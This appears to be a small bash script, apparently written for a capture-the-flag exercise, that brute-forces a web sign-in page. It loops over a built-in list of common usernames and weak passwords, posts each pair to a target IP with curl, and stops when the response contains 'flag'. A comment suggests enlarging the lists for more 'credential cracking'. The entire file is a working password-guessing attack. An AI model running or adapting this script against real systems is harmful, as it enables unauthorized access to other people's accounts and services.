IP=
# arrays can be made more exstensive for increase credential cracking
usernames=(root admin test guest info adm mysql user administrator oracle ftp pi puppet ansible ec2-user vagrant azureuser)
passwords=(root admin test shadow matrix ghost sleeper slider guest 123456 aaron jun rebecca einstein anna sara singnin amy 12345 !@#$%^ 555555 tracy  password1)

for user in ${usernames[@]}; do
  for pass in ${passwords[@]}; do
    echo "http://$IP/index.php?page=signin&username=${user}&password=${pass}&Login=Login#"
	  curl -X POST "http://$IP/index.php?page=signin&username=${user}&password=${pass}&Login=Login#" | grep 'flag' && exit 1 || continue
  done
done

